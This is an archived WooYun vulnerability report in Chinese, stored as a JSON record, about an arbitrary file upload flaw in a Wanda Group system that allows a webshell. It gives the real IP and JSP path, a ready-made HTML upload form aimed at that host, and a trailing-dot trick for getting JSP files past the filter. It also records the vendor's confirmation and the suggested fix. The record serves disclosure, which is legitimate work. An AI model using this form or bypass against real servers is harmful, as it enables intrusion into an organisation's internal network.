{"id": 66543, "wybug_id": "wooyun-2015-0141194", "wybug_title": "万达某重要系统任意文件上传已Getshell(影响内网安全)", "wybug_corp": "大连万达集团股份有限公司", "wybug_author": "路人甲", "wybug_date": "2015-09-15 09:39", "wybug_open_date": "2015-10-30 10:52", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-30：\t细节向公众公开  简要描述： 任意文件上传 详细说明：  URL：http://60.10.8.227:88嗯，还是这套系统，又有个任意文件上传漏洞，可上传任意文件至任意目录。存在漏洞的文件：/page/maint/common/UserResourceUpload.jsp构造如下表单便可轻易getshell：\n<html><form method='post' action='http://60.10.8.227:88/page/maint/common/UserResourceUpload.jsp?dir=/'  enctype=\"multipart/form-data\" > <input type=\"file\" id=\"file\" name=\"test\" style=\"height:20px;BORDER: #8F908B 1px solid;\"/><button type=submit value=\"getshell\">getshell</button> </form></html>\n可直接上传html、txt之类的文件，要上传jsp文件，需要一个非常简单的绕过，Windows服务器在文件名后加 . 便可在服务器上生成jsp文件。\n\n执行操作系统命令：\n\n数据库配置：\n\n   漏洞证明：  参考详细说明   修复方案：  联系开发厂商修复；临时措施：对该文件设置访问限制，或临时删除该文件。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-09-15 10:51 厂商回复： 感谢路人甲同学的关注与贡献！马上通知业务整改！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}